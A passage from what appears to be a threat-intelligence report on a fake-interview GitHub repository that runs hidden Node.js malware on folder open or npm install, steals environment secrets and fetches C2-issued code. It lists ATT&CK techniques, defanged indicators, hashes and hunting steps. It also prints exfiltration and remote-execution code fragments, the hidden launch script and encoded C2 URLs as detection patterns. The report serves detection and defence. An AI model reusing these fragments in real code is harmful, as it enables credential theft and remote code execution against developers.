| T1059.007 | JavaScript/JScript | Execution | Backend loader, Vercel response, and tasking messages execute under Node.js |
| T1027 | Obfuscated Files or Information | Defense Evasion | Returned payload uses rotated encoded strings and concealed Base64 endpoints |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | Runtime decodes `AUTH_API`, C2 URL, and obfuscated strings |
| T1036 | Masquerading | Defense Evasion | Exfiltration and remote execution are disguised as API-key verification and IP checking |
| T1105 | Ingress Tool Transfer | Command and Control | Vercel gate delivers JavaScript; tasking C2 can return additional executable JavaScript |
| T1071.001 | Web Protocols | Command and Control | HTTPS gate and HTTP tasking protocol |
| T1082 | System Information Discovery | Discovery | Hostname, OS type, release, and platform collected |
| T1016 | System Network Configuration Discovery | Discovery | Network interfaces enumerated to identify a non-loopback MAC address |
| T1119 | Automated Collection | Collection | Complete `process.env` and host profile collected automatically |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | Committed `.env` files are loaded and all resulting values are transmitted |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Environment and host data sent to Vercel and registrar/tasking infrastructure |

The current evidence does not establish durable boot persistence such as cron, systemd, LaunchAgents, registry Run keys, services, or scheduled tasks. Re-execution is repository-resident through VS Code tasks and npm lifecycle behavior.

---

## Infrastructure Analysis

### Delivery and Tasking Infrastructure

| Indicator | Role | Status during investigation |
|---|---|---|
| `ip-testcheck[.]vercel[.]app` | Environment-collection and Stage-1 delivery gate | Active; returned obfuscated JavaScript |
| `hxxps://ip-testcheck[.]vercel[.]app/api` | POST endpoint | Active; HTTP 200 captured |
| `x-app-request: ip-check` | Gate header | Required by repository code |
| `136.243.22[.]62` | Registrar/tasking host | Active during controlled query |
| `136.243.22[.]62:1224` | Tasking service | Active; Express JSON response captured |
| `/api/checkStatus` | Enrollment and tasking path | Active |

Vercel is a legitimate cloud platform. Its presence indicates abuse of shared hosting, not provider involvement.

The C2 IP had a `your-server.de` reverse-DNS name during collection. The scan behavior was anomalous and should not be used to infer that hundreds of unrelated services were genuinely exposed. Only the C2 application on port `1224` was independently verified.

### Historical Repository Pivots

The following Vercel applications were recovered from Git history. They were not all contacted during this investigation:

```text
0g-auth-check[.]vercel[.]app
oracle-v3-nu[.]vercel[.]app
oracle-reg-check[.]vercel[.]app
ip-checking-notification-pic[.]vercel[.]app
ipcheck-six[.]vercel[.]app
test-ip-check[.]vercel[.]app
ip-testcheck[.]vercel[.]app
```

These domains are useful for retrospective hunting and repository-cluster searches. They should be labeled historical unless independent telemetry confirms activity.

---

## Indicators of Compromise

> Indicators are defanged. Historical indicators recovered only from Git history are labeled accordingly.

### Current Network Indicators

| Indicator | Type | Role |
|---|---|---|
| `ip-testcheck[.]vercel[.]app` | Domain | Current Vercel gate |
| `hxxps://ip-testcheck[.]vercel[.]app/api` | URL | Environment POST and payload response |
| `x-app-request: ip-check` | HTTP header | Gate marker |
| `136.243.22[.]62` | IPv4 | Registrar/tasking host |
| `136.243.22[.]62:1224` | Host/port | Registrar/tasking service |
| `hxxp://136.243.22[.]62:1224/api/checkStatus` | URL | Beacon endpoint |

### Encoded and Runtime Markers

| Indicator | Decoded value / role |
|---|---|
| `aHR0cHM6Ly9pcC10ZXN0Y2hlY2sudmVyY2VsLmFwcC9hcGk=` | `https://ip-testcheck.vercel.app/api` |
| `aHR0cDovLzEzNi4yNDMuMjIuNjI6MTIyNC9hcGkvY2hlY2tTdGF0dXM=` | `http://136.243.22.62:1224/api/checkStatus` |
| `Y3Jhc2ggdGhlIGJhZCBndXlz` | `crash the bad guys` campaign marker |
| `sysInfo` | Host-profile query field |
| `processInfo` | Environment query field |
| `tid` | Campaign/task-group field |
| `sysId` | Server-assigned enrollment identifier |
| `server connected` | Observed standby response message |

### GitHub and Repository Indicators

| Indicator | Type | Notes |
|---|---|---|
| `interexyorg/Gamifly` | GitHub repository | One observed distribution point |
| `Interexywork/Gamifly` | GitHub repository | Exact duplicate distribution point |
| `d86eff13748e4680b05f22a726323b9cdb00c077` | Git commit | Acquired `main` HEAD |
| `971cbac39a1bd57fe8fed8c7721302b3a1e1f7b0` | Git tree | Acquired HEAD tree |
| `ed6951320edd99bfdafefe106eaa97fff37e34539f25d95d9206432d0f8b5427` | SHA-256 | Shared Git packfile |
| `.vscode/tasks.json` | File | Hidden automatic task configuration |
| `runOn: folderOpen` | VS Code setting | Automatic execution marker |
| `npm install --silent --no-progress` | Command | Hidden dependency/lifecycle trigger |
| `start /b node server || nohup node server &` | npm script | Cross-platform background launch |
| `AUTH_API` | Environment key | Base64 delivery-gate URL |
| `new Function("require", response.data)` | Code pattern | Remote response execution |

### Historical Vercel Indicators

```text
0g-auth-check[.]vercel[.]app
oracle-v3-nu[.]vercel[.]app
oracle-reg-check[.]vercel[.]app
ip-checking-notification-pic[.]vercel[.]app
ipcheck-six[.]vercel[.]app
test-ip-check[.]vercel[.]app
```


### Follow-on Hunting Indicators

> The following indicators belong to repositories identified after the original incident. They support cluster hunting and should not be interpreted as infrastructure delivered by the `blakesmith.bz@gmail[.]com` interview persona.

| Indicator | Type | Role |
|---|---|---|
| `LimitBreak-Solutions/AjunaVerse` | GitHub repository | Follow-on sibling repository sharing Gamifly Git objects |
| `AlchemyGlobal/AlchemyMVP` | GitHub repository | Follow-on sibling repository sharing Gamifly Git objects |
| `89da1a9d1e0856957afa2217af2241257ac3670f` | Git commit | Exact shared payload-integration commit |
| `ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6` | Git commit | Exact shared authentication-route commit |
| `vscode-settings-529[.]vercel[.]app` | Domain | Current platform-specific downloader observed in both sibling repositories |
| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/mac` | URL | macOS payload path |
| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/linux` | URL | Linux payload path |
| `hxxps://vscode-settings-529[.]vercel[.]app/api/settings/windows` | URL | Windows payload path |
| `138.201.128[.]169` | IPv4 | Follow-on registrar/tasking host embedded in both repositories |
| `hxxp://138.201.128[.]169:1224/api/checkStatus` | URL | Follow-on beacon endpoint |
| `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` | Encoded marker | Decodes to `now it time to get everything` |

### File and Evidence Hashes

| SHA-256 | Artifact |
|---|---|
| `e046bb2c01ee3cdf4b18671e537e6d7c74a6b4a2d5407dc8fee3b00b78b2df1c` | `github_Interexywork_Gamifly_20260604T145743Z.tar.gz` |
| `167ed0037b4bf9ef9c568516f11049460fc03d46fee23ffea96baf0f8a821c37` | `github_interexyorg_Gamifly_20260604T145847Z.tar.gz` |
| `ed6951320edd99bfdafefe106eaa97fff37e34539f25d95d9206432d0f8b5427` | Identical Git packfile in both mirrors |
| `0ca52ada0ea9ccecd2d0a5f75fa90aee52e496e790cdc2cc51cbdebd92764a68` | `.vscode/tasks.json` |
| `c913a6b89e6f2d51cb9d6b45f75970cf571784453e85b3051b0409dabc1eb2f0` | `package.json` |
| `4f57c2602488c1c72bf4bfbb2c720cd806922b1b9dd87a1007025be848e20fd7` | `server.js` |
| `4e771d7ec5bf9f5507f56bb9949b6cbd42ea34cc77e6fe5f94926265393b03cd` | `.env` |
| `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `.env.local` |
| `c08356a5a4ebbd8804c9acbe2e0c1b986d867b057d2e827ae663e4aec2204ed2` | `config/loadEnv.js` |
| `a9d8ea7c9a396d5c1f04d998f4f3e944c67ec4c88524a05c613bcb1ca0a7eacf` | `routes/index.js` |
| `28e73ce85db813ba0839ee077428eaa121037e3a1ec8a13b1171e68cc2a0accd` | `routes/api/auth.js` |
| `ad32d7d9e9027a24a02bc2c517def548731c964e4cd46d4fa3bbbed8ffcb9b8a` | `controllers/auth.js` |
| `141ba5f2c08dd691c59c8250f13e8e223e8b9bdbcd2756f662ad9d29775a63fb` | Captured obfuscated Stage-1 JavaScript |
| `626c20cec7a4a097be18078ef714129770d453fe02f4ea8f50c97373d3dd5189` | Captured tasking standby JSON |

---

## Hunting and Detection

### Repository and Source-Code Hunting

Search source repositories and developer workspaces for the combined pattern:

```text
.vscode/tasks.json
runOptions.runOn = folderOpen
presentation.reveal = never
npm install --silent --no-progress
prepare = start /b node server || nohup node server &
AUTH_API = base64-encoded URL
x-app-request = ip-check
axios.post(api, { ...process.env })
new Function("require", response.data)
```

Any single item may be benign. The combination is highly specific.

For repository-lineage hunting, also search Git object databases for the exact commits:

```text
89da1a9d1e0856957afa2217af2241257ac3670f
ce9deb2ec4a745305eadbcdca57d4f5eeedb35f6
```

For the newer sibling generation, combine:

```text
vscode-settings-529.vercel.app
/api/settings/mac
/api/settings/linux
/api/settings/windows
"prepare": "start /b node server || nohup node server &"
138.201.128.169:1224/api/checkStatus
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
pokersolver
```

Useful command-line search:

```bash
grep -RInE \
  'runOn.{0,20}folderOpen|x-app-request.{0,20}ip-check|new Function\("require", response\.data\)|axios\.post\(api, \{ \.\.\.process\.env \}\)|AUTH_API' \
  . --exclude-dir=node_modules --exclude-dir=.git
```

Inspect npm lifecycle scripts before installation:

```bash
jq '.scripts' package.json
npm pkg get scripts
```

Inspect VS Code tasks without opening the folder in a trusted editor:

```bash
jq '.tasks[] | {label, command, dependsOn, runOptions, presentation}' .vscode/tasks.json
```

### Network Hunting

Alert on:

```text
POST /api to unknown Vercel applications
HTTP header: x-app-request: ip-check
JSON bodies containing many environment-variable names
GET /api/checkStatus with sysInfo, processInfo, tid, and sysId
Node.js processes contacting IP-literal hosts on TCP/1224
five-second periodic requests from developer workstations
```

Because `processInfo` is sent in the URL, proxy and web-server logs may retain environment values. Investigators should protect and minimize access to those logs as potentially sensitive evidence.

### Host Hunting

If the project was opened or dependencies were installed:

1. Isolate the workstation where practical.
2. Review Node.js process trees and process-start telemetry.
3. Check VS Code task execution history and terminal records.
4. Review shell history for `npm install`, `node server.js`, or repository setup commands.
5. Search DNS, proxy, firewall, and EDR telemetry for the listed Vercel and C2 indicators.
6. Identify every secret that could have been present in the inherited environment, `.env`, `.env.local`, shell profile, CI context, or parent process.
7. Revoke and rotate exposed credentials, including cloud, Git, npm, package-registry, payment, Web3 RPC, wallet, database, SSH, and API tokens.
8. Audit GitHub/GitLab/Bitbucket, cloud, wallet, and payment activity for unauthorized use.
9. Treat any C2-issued `sysId` or repeated five-second beacon as evidence of successful enrollment.

### Preventive Controls

- Open unsolicited coding-test repositories only in disposable virtual machines.
- Keep VS Code Workspace Trust enabled and deny automatic tasks for untrusted folders.
- Review `.vscode/tasks.json`, `.devcontainer`, npm scripts, and Git hooks before installation.
- Use `npm install --ignore-scripts` for initial static review where operationally appropriate.
- Do not load real secrets into interview assignments or untrusted repositories.
- Restrict developer egress to IP-literal HTTP services and unusual ports where feasible.
- Detect Vercel-hosted endpoints receiving high-entropy or credential-shaped JSON from developer workstations.

---

## Attribution Assessment

### Technical Cluster

Assessed confidence: **high** that this case reuses and evolves the same loader/tooling cluster documented in BetPoker and Dravion-Core.

The assessment is based on exact file hashes, identical malicious route code, the same environment-loading design, the same custom header, the same response-execution primitive, the same tasking schema, the same polling cadence, and the same recurring C2 port. Infrastructure and campaign markers changed, but the higher-level protocol and implementation remained stable. Follow-on identification of AjunaVerse and AlchemyMVP adds exact cross-repository Git-object lineage and functionally identical newer branches, further supporting a maintained repository-production pipeline rather than isolated code reuse.

### Broader Actor Context

Assessed confidence: **low-to-medium** for specific DPRK-linked attribution and **medium** for consistency with Contagious Interview-style activity.

The operation uses developer recruitment, LinkedIn contact, interview scheduling, repository delivery, Web3 themes, developer-environment credential theft, staged JavaScript, and delayed operator tasking. These behaviors are consistent with publicly reported DPRK-linked fake-interview campaigns. However, this investigation does not contain a uniquely attributable operator account, cryptographic key, infrastructure-registration record, victimology dataset, or recovered task that independently proves state sponsorship.

### Brand and Identity Boundary

No evidence establishes that the legitimate Interexy organization or any real person named in Git metadata knowingly participated. GitHub organization names, commit authors, recruiter personas, and email fields may be fabricated, copied, compromised, or impersonated. They are pivots, not attribution conclusions.

---


## Collection and Analysis Boundaries

This report is based on static repository analysis and controlled retrieval of remote responses. The recovered Vercel payload was not executed. The tasking endpoint was queried using a controlled reproduction of its protocol, and the returned JSON was preserved without evaluating any `message` content.

The investigation did not receive operator tasking and therefore does not claim a specific post-enrollment payload beyond the capabilities directly present in the registrar implant. The implant itself nevertheless provides arbitrary JavaScript execution and complete environment exfiltration.

External reporting is used for campaign context and cross-case comparison. Exact file-level and protocol-level matches are distinguished from broader behavioral similarities.

## References

- ThreatProphet, **BetPoker Interview Lure: Dual Execution Paths, Credential Exfiltration, and a Dormant Node.js Backdoor**, March 2, 2026: `https://threatprophet.com/posts/2026-03-02-betpoker/`
- ThreatProphet, **Dravion-Core Fake Interview Repository**, April 13, 2026: `https://threatprophet.com/posts/2026-04-13-dravion-core/`
- ThreatProphet, **Kryptic Haven-Branded Git Challenge**, May 17, 2026: `https://threatprophet.com/posts/2026-05-17-kryptic-haven/`
- GitHub repository observed during collection: `https://github.com/interexyorg/Gamifly`
- Duplicate GitHub repository observed during collection: `https://github.com/Interexywork/Gamifly`
- Follow-on Git-lineage repository: `https://github.com/LimitBreak-Solutions/AjunaVerse`
- Follow-on Git-lineage repository: `https://github.com/AlchemyGlobal/AlchemyMVP`

*TLP:CLEAR — This report may be freely shared. Attribution assessments are tentative and based on exact artifact reuse, protocol continuity, infrastructure rotation, and tradecraft similarity. All indicators are provided for defensive purposes. References to Interexy describe observed lure branding and repository names, not validated involvement by any legitimate company or real person.*

*Report ID: TP-2026-016 | Published: 2026-06-09 | Author: ThreatProphet*
